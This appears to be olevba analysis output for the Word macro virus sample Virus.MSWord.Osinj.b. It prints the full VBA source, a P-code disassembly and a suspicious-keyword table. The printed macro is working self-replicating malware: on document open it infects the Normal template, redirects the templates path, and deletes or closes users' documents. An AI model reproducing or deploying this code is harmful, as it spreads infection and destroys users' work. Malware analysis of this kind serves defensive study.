olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Osinj.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Osinj.cls 
in file: Virus.MSWord.Osinj.b - OLE stream: 'Macros/VBA/Osinj'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
'
' Âñå òàêè äîáðàëàñÿ, ñâîëî÷?! À øîá òåáå êà÷êà êîïíóëà çàäíüîþ íîãîþ!
' For not ukrainers: Fuck you. From Ukraine!
'
If ActiveDocument.Path <> "" _
        And ActiveDocument.Name <> "Normal.doc" And ActiveDocument.Name _
        <> "Normal.dot" And InStr(2, Options.DefaultFilePath(wdUserTemplatesPath), _
        "\normal", 1) <> 0 And Osinj = "Normal.dot" Then
    SName$ = ActiveDocument.Name
    SPath$ = ActiveDocument.Path
    Selection.WholeStory
    Selection.Copy
    Vesna.Two
    ChangeFileOpenDirectory Path:=ActiveDocument.Path
    Vesna.Three
    ChangeFileOpenDirectory _
        Options.DefaultFilePath(wdUserTemplatesPath)
    Documents.Open FileName:="Normal.doc", ConfirmConversions:=False, ReadOnly _
        :=False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate _
        :="mark", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="" _
        , Format:=wdOpenFormatAuto
    Selection.Paste
    aa% = 1
    bb% = 1
    cc% = 1
    dd% = 1
    ChangeFileOpenDirectory Path:=SPath
    If Documents.Count > 0 Then
      ActiveDocument.SaveAs FileName:=SName, FileFormat:= _
        wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
        True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
        False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
        SaveAsAOCELetter:=False
    End If
    If Date > _
        FileDateTime(Options.DefaultFilePath(wdUserTemplatesPath) + "\Normal2.doc") + 10 Then
        Do
        aa = MsgBox("Are you down?", vbQuestion Or vbYesNo, "Osinj")
        If aa = 7 Then
            bb = MsgBox("Are you sure?", vbDefaultButton2 Or vbQuestion Or vbYesNo, "Osinj")
            If bb = 6 Then
                MsgBox "Ms Word works for downs only.", vbInformation
                Selection.TypeText Text:="d"
                Selection.MoveLeft Unit:=wdCharacter, Count:=1
                Selection.MoveRight Unit:=wdCharacter, Count:=1, Extend:=wdExtend
                Selection.Cut
                For cc = 1 To Documents.Count
                    Vesna.Four (cc)
                    aa = 6
                Next cc
            Interaction.SendKeys "%{F4}"
            End If
        End If
        Loop While aa = 7
    End If
ElseIf Osinj <> "Normal.dot" And Osinj <> "" Then
''---------------------------------------''
    b$ = "False"
    On Error GoTo ErrLabel
    SourceName$ = ActiveDocument.Name
    c$ = "Normal.doc"
    Windows(c).Activate
    If b = "True" Or ActiveDocument.Name = c Then
        Varriable = Options.DefaultFilePath(wdUserTemplatesPath)
        If InStr(2, Options.DefaultFilePath(wdUserTemplatesPath), "\normal", 1) = 0 Then
            werh = True
            Selection.WholeStory
            Selection.Delete
            SourcePath$ = ActiveDocument.Path
            ChangeFileOpenDirectory Path:=Options.DefaultFilePath(Path:=wdUserTemplatesPath)
            If Dir("Normal", vbDirectory) = "" Then
                MkDir Path:="Normal"
            End If
            ChangeFileOpenDirectory Path:=Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\Normal"
            ActiveDocument.SaveAs FileName:="Normal2.doc", FileFormat:= _
                wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
                True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
                False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
            SaveAsAOCELetter:=False
            ActiveDocument.SaveAs FileName:="Normal.doc", FileFormat:= _
                wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
                True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
                False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
            SaveAsAOCELetter:=False
            ChangeFileOpenDirectory Path:=SourcePath
            Documents.Open FileName:=SourceName, ConfirmConversions:=False, ReadOnly:= _
                False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate:= _
                "", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="", _
                Format:=wdOpenFormatAuto
            ChangeFileOpenDirectory Path:=Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\Normal"
            ActiveDocument.SaveAs FileName:="Normal.dot", FileFormat:= _
                wdFormatTemplate, LockComments:=False, Password:="", AddToRecentFiles:= _
                True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
                False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
                SaveAsAOCELetter:=False
            Options.DefaultFilePath(wdUserTemplatesPath) = Options.DefaultFilePath(wdUserTemplatesPath) + "\Normal"
            ActiveDocument.Save
            ActiveDocument.Close
            ActiveDocument.Save
            ChangeFileOpenDirectory Path:=SourcePath
            Documents.Open FileName:=SourceName, ConfirmConversions:=False, ReadOnly:= _
                False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate:= _
                "", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="", _
                Format:=wdOpenFormatAuto
            Windows("Normal.doc").Activate
            ActiveWindow.Close
        End If
    End If
''---------------------------------------''
    End If
ErrLabel:
    Select Case Err.Number
        Case Is = 5941
        b = "True"
        If c = "Normal.doc" Then
        c = "Normal.dot"
        Else
        c = SourceName
        End If
        Err.Clear
        Resume
    End Select
End Sub


-------------------------------------------------------------------------------
VBA MACRO Vesna.bas 
in file: Virus.MSWord.Osinj.b - OLE stream: 'Macros/VBA/Vesna'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub One()
    ActiveWindow.Close True
End Sub
Sub Two()
    Selection.Cut
End Sub
Sub Three()
    ActiveWindow.Close False
End Sub
Sub Four(f)
    If ActiveDocument.Path = "" Then
      MsgBox "You can find this document in folder " _
        + Options.DefaultFilePath(wdUserTemplatesPath), vbInformation
      ChangeFileOpenDirectory Path:=Options.DefaultFilePath(Path:=wdUserTemplatesPath)
      ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:= _
        wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
        True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
        False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
        SaveAsAOCELetter:=False
    Else
      ActiveDocument.Save
    End If
    ActiveDocument.Close
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Osinj.b
' ===============================================================================
' Module streams:
' Macros/VBA/Osinj - 11971 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub Document_Open())
' Line #2:
' 	QuoteRem 0x0000 0x0000 ""
' Line #3:
' 	QuoteRem 0x0000 0x0045 " Âñå òàêè äîáðàëàñÿ, ñâîëî÷?! À øîá òåáå êà÷êà êîïíóëà çàäíüîþ íîãîþ!"
' Line #4:
' 	QuoteRem 0x0000 0x002B " For not ukrainers: Fuck you. From Ukraine!"
' Line #5:
' 	QuoteRem 0x0000 0x0000 ""
' Line #6:
' 	LineCont 0x000C 06 00 08 00 10 00 08 00 1E 00 08 00
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x000A "Normal.doc"
' 	Ne 
' 	And 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x000A "Normal.dot"
' 	Ne 
' 	And 
' 	LitDI2 0x0002 
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0007 "\normal"
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	And 
' 	Ld Osinj 
' 	LitStr 0x000A "Normal.dot"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #7:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St SName$ 
' Line #8:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	St SPath$ 
' Line #9:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #10:
' 	Ld Selection 
' 	ArgsMemCall Copy 0x0000 
' Line #11:
' 	Ld Vesna 
' 	ArgsMemCall Two 0x0000 
' Line #12:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	ParamNamed Path 
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #13:
' 	Ld Vesna 
' 	ArgsMemCall Three 0x0000 
' Line #14:
' 	LineCont 0x0004 01 00 08 00
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #15:
' 	LineCont 0x000C 0C 00 08 00 18 00 08 00 26 00 08 00
' 	LitStr 0x000A "Normal.doc"
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	LitStr 0x0004 "mark"
' 	ParamNamed PasswordTemplate 
' 	LitVarSpecial (False)
' 	ParamNamed Revert 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePasswordDocument 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePasswordTemplate 
' 	Ld wdOpenFormatAuto 
' 	ParamNamed Format$ 
' 	Ld Documents 
' 	ArgsMemCall Option 0x000A 
' Line #16:
' 	Ld Selection 
' 	ArgsMemCall Paste 0x0000 
' Line #17:
' 	LitDI2 0x0001 
' 	St aa% 
' Line #18:
' 	LitDI2 0x0001 
' 	St bb% 
' Line #19:
' 	LitDI2 0x0001 
' 	St cc% 
' Line #20:
' 	LitDI2 0x0001 
' 	St dd% 
' Line #21:
' 	Ld SPath 
' 	ParamNamed Path 
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #22:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #23:
' 	LineCont 0x0010 09 00 08 00 15 00 08 00 21 00 08 00 2B 00 08 00
' 	Ld SName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitVarSpecial (True)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitVarSpecial (False)
' 	ParamNamed EmbedTrueTypeFonts 
' 	LitVarSpecial (False)
' 	ParamNamed SaveNativePictureFormat 
' 	LitVarSpecial (False)
' 	ParamNamed SaveFormsData 
' 	LitVarSpecial (False)
' 	ParamNamed SaveAsAOCELetter 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x000B 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	LineCont 0x0004 03 00 08 00
' 	Ld Date 
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000C "\Normal2.doc"
' 	Add 
' 	ArgsLd FileDateTime 0x0001 
' 	LitDI2 0x000A 
' 	Add 
' 	Gt 
' 	IfBlock 
' Line #26:
' 	Do 
' Line #27:
' 	LitStr 0x000D "Are you down?"
' 	Ld vbQuestion 
' 	Ld vbYesNo 
' 	Or 
' 	LitStr 0x0005 "Osinj"
' 	ArgsLd MsgBox 0x0003 
' 	St aa 
' Line #28:
' 	Ld aa 
' 	LitDI2 0x0007 
' 	Eq 
' 	IfBlock 
' Line #29:
' 	LitStr 0x000D "Are you sure?"
' 	Ld vbDefaultButton2 
' 	Ld vbQuestion 
' 	Or 
' 	Ld vbYesNo 
' 	Or 
' 	LitStr 0x0005 "Osinj"
' 	ArgsLd MsgBox 0x0003 
' 	St bb 
' Line #30:
' 	Ld bb 
' 	LitDI2 0x0006 
' 	Eq 
' 	IfBlock 
' Line #31:
' 	LitStr 0x001D "Ms Word works for downs only."
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' Line #32:
' 	LitStr 0x0001 "d"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #33:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveLeft 0x0002 
' Line #34:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall MoveRight 0x0003 
' Line #35:
' 	Ld Selection 
' 	ArgsMemCall Cut 0x0000 
' Line #36:
' 	StartForVariable 
' 	Ld cc 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #37:
' 	Ld cc 
' 	Paren 
' 	Ld Vesna 
' 	ArgsMemCall Four 0x0001 
' Line #38:
' 	LitDI2 0x0006 
' 	St aa 
' Line #39:
' 	StartForVariable 
' 	Ld cc 
' 	EndForVariable 
' 	NextVar 
' Line #40:
' 	LitStr 0x0005 "%{F4}"
' 	Ld Interaction 
' 	ArgsMemCall SendKeys 0x0001 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	Ld aa 
' 	LitDI2 0x0007 
' 	Eq 
' 	LoopWhile 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Ld Osinj 
' 	LitStr 0x000A "Normal.dot"
' 	Ne 
' 	Ld Osinj 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	ElseIfBlock 
' Line #46:
' 	QuoteRem 0x0000 0x002A "'---------------------------------------''"
' Line #47:
' 	LitStr 0x0005 "False"
' 	St B$ 
' Line #48:
' 	OnError ErrLabel 
' Line #49:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St SourceName$ 
' Line #50:
' 	LitStr 0x000A "Normal.doc"
' 	St c$ 
' Line #51:
' 	Ld c 
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #52:
' 	Ld B 
' 	LitStr 0x0004 "True"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld c 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #53:
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St Varriable 
' Line #54:
' 	LitDI2 0x0002 
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0007 "\normal"
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	St werh 
' Line #56:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #57:
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0000 
' Line #58:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	St SourcePath$ 
' Line #59:
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	ParamNamed Path 
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #60:
' 	LitStr 0x0006 "Normal"
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #61:
' 	LitStr 0x0006 "Normal"
' 	ParamNamed Path 
' 	ArgsCall MkDir 0x0001 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0007 "\Normal"
' 	Add 
' 	ParamNamed Path 
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #64:
' 	LineCont 0x0010 09 00 10 00 15 00 10 00 21 00 10 00 2B 00 0C 00
' 	LitStr 0x000B "Normal2.doc"
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitVarSpecial (True)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitVarSpecial (False)
' 	ParamNamed EmbedTrueTypeFonts 
' 	LitVarSpecial (False)
' 	ParamNamed SaveNativePictureFormat 
' 	LitVarSpecial (False)
' 	ParamNamed SaveFormsData 
' 	LitVarSpecial (False)
' 	ParamNamed SaveAsAOCELetter 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x000B 
' Line #65:
' 	LineCont 0x0010 09 00 10 00 15 00 10 00 21 00 10 00 2B 00 0C 00
' 	LitStr 0x000A "Normal.doc"
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitVarSpecial (True)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitVarSpecial (False)
' 	ParamNamed EmbedTrueTypeFonts 
' 	LitVarSpecial (False)
' 	ParamNamed SaveNativePictureFormat 
' 	LitVarSpecial (False)
' 	ParamNamed SaveFormsData 
' 	LitVarSpecial (False)
' 	ParamNamed SaveAsAOCELetter 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x000B 
' Line #66:
' 	Ld SourcePath 
' 	ParamNamed Path 
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #67:
' 	LineCont 0x000C 0D 00 10 00 19 00 10 00 27 00 10 00
' 	Ld SourceName 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordTemplate 
' 	LitVarSpecial (False)
' 	ParamNamed Revert 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePasswordDocument 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePasswordTemplate 
' 	Ld wdOpenFormatAuto 
' 	ParamNamed Format$ 
' 	Ld Documents 
' 	ArgsMemCall Option 0x000A 
' Line #68:
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0007 "\Normal"
' 	Add 
' 	ParamNamed Path 
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #69:
' 	LineCont 0x0010 09 00 10 00 15 00 10 00 21 00 10 00 2B 00 10 00
' 	LitStr 0x000A "Normal.dot"
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitVarSpecial (True)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitVarSpecial (False)
' 	ParamNamed EmbedTrueTypeFonts 
' 	LitVarSpecial (False)
' 	ParamNamed SaveNativePictureFormat 
' 	LitVarSpecial (False)
' 	ParamNamed SaveFormsData 
' 	LitVarSpecial (False)
' 	ParamNamed SaveAsAOCELetter 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x000B 
' Line #70:
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0007 "\Normal"
' 	Add 
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #71:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #72:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #73:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #74:
' 	Ld SourcePath 
' 	ParamNamed Path 
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #75:
' 	LineCont 0x000C 0D 00 10 00 19 00 10 00 27 00 10 00
' 	Ld SourceName 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordTemplate 
' 	LitVarSpecial (False)
' 	ParamNamed Revert 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePasswordDocument 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePasswordTemplate 
' 	Ld wdOpenFormatAuto 
' 	ParamNamed Format$ 
' 	Ld Documents 
' 	ArgsMemCall Option 0x000A 
' Line #76:
' 	LitStr 0x000A "Normal.doc"
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #77:
' 	Ld ActiveWindow 
' 	ArgsMemCall Close 0x0000 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	QuoteRem 0x0000 0x002A "'---------------------------------------''"
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	Label ErrLabel 
' Line #83:
' 	Ld Err 
' 	MemLd Number 
' 	SelectCase 
' Line #84:
' 	LitDI2 0x1735 
' 	CaseEq 
' 	CaseDone 
' Line #85:
' 	LitStr 0x0004 "True"
' 	St B 
' Line #86:
' 	Ld c 
' 	LitStr 0x000A "Normal.doc"
' 	Eq 
' 	IfBlock 
' Line #87:
' 	LitStr 0x000A "Normal.dot"
' 	St c 
' Line #88:
' 	ElseBlock 
' Line #89:
' 	Ld SourceName 
' 	St c 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	Ld Err 
' 	ArgsMemCall Clear 0x0000 
' Line #92:
' 	Resume  
' Line #93:
' 	EndSelect 
' Line #94:
' 	EndSub 
' Line #95:
' Line #96:
' Macros/VBA/Vesna - 4875 bytes
' Line #0:
' 	FuncDefn (Sub One())
' Line #1:
' 	LitVarSpecial (True)
' 	Ld ActiveWindow 
' 	ArgsMemCall Close 0x0001 
' Line #2:
' 	EndSub 
' Line #3:
' 	FuncDefn (Sub Two())
' Line #4:
' 	Ld Selection 
' 	ArgsMemCall Cut 0x0000 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Sub Three())
' Line #7:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	ArgsMemCall Close 0x0001 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Sub Four(False))
' Line #10:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #11:
' 	LineCont 0x0004 02 00 08 00
' 	LitStr 0x0025 "You can find this document in folder "
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	Add 
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' Line #12:
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	ParamNamed Path 
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #13:
' 	LineCont 0x0010 0B 00 08 00 17 00 08 00 23 00 08 00 2D 00 08 00
' 	Ld ActiveDocument 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitVarSpecial (True)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitVarSpecial (False)
' 	ParamNamed EmbedTrueTypeFonts 
' 	LitVarSpecial (False)
' 	ParamNamed SaveNativePictureFormat 
' 	LitVarSpecial (False)
' 	ParamNamed SaveFormsData 
' 	LitVarSpecial (False)
' 	ParamNamed SaveAsAOCELetter 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x000B 
' Line #14:
' 	ElseBlock 
' Line #15:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #18:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

